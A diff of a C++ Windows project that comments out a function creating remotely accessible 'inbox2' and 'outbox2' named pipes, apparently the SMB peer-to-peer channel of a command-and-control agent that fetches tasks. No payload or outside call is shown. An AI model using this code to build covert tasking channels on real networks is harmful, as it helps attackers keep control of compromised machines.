@@ -93,48 +93,49 @@ namespace SMB {
             return true;
         }
 
-        int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe) {
-            std::wstring wstr_pipe_inbox = L"\\\\.\\pipe\\inbox2";
+        //in comms.h now
+        // int register_pipe(HANDLE& h_inbox_pipe, HANDLE& h_outbox_pipe) {
+        //     std::wstring wstr_pipe_inbox = L"\\\\.\\pipe\\inbox2";
 
-            DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
+        //     DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
 
-            // STRIPPED: FILE_FLAG_OVERLAPPED
-            h_inbox_pipe = WinApi::CreateNamedPipeW(
-                wstr_pipe_inbox.c_str(),
-                PIPE_ACCESS_INBOUND,
-                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
-                1, 4096, 4096, 0, NULL
-            );
+        //     // STRIPPED: FILE_FLAG_OVERLAPPED
+        //     h_inbox_pipe = WinApi::CreateNamedPipeW(
+        //         wstr_pipe_inbox.c_str(),
+        //         PIPE_ACCESS_INBOUND,
+        //         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
+        //         1, 4096, 4096, 0, NULL
+        //     );
 
-            if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << WinApi::GetLastError());
-                return 1;
-            }
-            DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registered successfully: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
+        //     if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
+        //         DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()) << " Error: " << WinApi::GetLastError());
+        //         return 1;
+        //     }
+        //     DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registered successfully: " << std::string(wstr_pipe_inbox.begin(), wstr_pipe_inbox.end()));
 
-            std::wstring wstr_pipe_outbox = L"\\\\.\\pipe\\outbox2";
+        //     std::wstring wstr_pipe_outbox = L"\\\\.\\pipe\\outbox2";
 
-            DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()));
+        //     DEBUG_LOG("[SMB::Child::register_pipe]: Attempting to register pipe" << std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()));
 
-            // STRIPPED: FILE_FLAG_OVERLAPPED
-            h_outbox_pipe = WinApi::CreateNamedPipeW(
-                wstr_pipe_outbox.c_str(),
-                PIPE_ACCESS_OUTBOUND,
-                PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
-                1, 4096, 4096, 0, NULL
-            );
+        //     // STRIPPED: FILE_FLAG_OVERLAPPED
+        //     h_outbox_pipe = WinApi::CreateNamedPipeW(
+        //         wstr_pipe_outbox.c_str(),
+        //         PIPE_ACCESS_OUTBOUND,
+        //         PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
+        //         1, 4096, 4096, 0, NULL
+        //     );
 
-            if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
-                DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << WinApi::GetLastError());
-                return 1;
-            }
+        //     if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
+        //         DEBUG_LOG("[SMB::Child::register_pipe]: Pipe registration failed: " <<std::string(wstr_pipe_outbox.begin(), wstr_pipe_outbox.end()) << " Error: " << WinApi::GetLastError());
+        //         return 1;
+        //     }
 
-            // Await connection for both pipes
-            if (!await_client_connection(h_inbox_pipe, "INBOX")) return 1;
-            if (!await_client_connection(h_outbox_pipe, "OUTBOX")) return 1;
+        //     // Await connection for both pipes
+        //     if (!await_client_connection(h_inbox_pipe, "INBOX")) return 1;
+        //     if (!await_client_connection(h_outbox_pipe, "OUTBOX")) return 1;
 
-            return 0;
-        }
+        //     return 0;
+        // }
     
         std::vector<uint8_t> fetch_tasks(HANDLE h_inbox, HANDLE h_outbox, const std::vector<uint8_t>& get_request_payload) {
             DWORD bytes_written = 0;
